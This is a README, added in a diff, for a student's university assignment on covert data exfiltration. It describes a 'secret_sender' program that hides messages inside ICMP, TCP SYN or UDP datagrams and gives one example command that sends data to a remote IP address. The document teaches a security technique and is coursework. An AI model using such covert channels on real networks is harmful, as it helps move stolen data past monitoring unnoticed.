@@ -1,0 +1,25 @@
+Name : Ravi Nihalani
+ASU ID : 1210448145
+———————————————————————————————————————
+Assignment 2 Part 1 — Data Exfiltration
+———————————————————————————————————————
+
+What is the program about ?
+
+Massive data transfers of entire credit card databases are flagged and caught. Therefore, quietly and secretly exfiltrating data is incredibly important.This is a program that exfiltrates data using the IP datagram.
+It sends the <message>, encoded as described below, to the IP address specified by <ip_address> on physical interface <interface>. <type> specifies the type of packet that the IP datagram will hold, where <type> will be one of:
+
+    0: ICMP Echo Request Message
+    1: TCP SYN packet to port 80
+    2: UDP packet to port 53
+
+
+How to run the program ?
+
+Program is a command-line interface and can be run on terminal by running the following command: 
+
+./secret_sender <ip_address> <interface> <type> <message>
+
+
+e.g. : ./secret_sender 192.168.5.2 eth0 1 SSisFUN
+
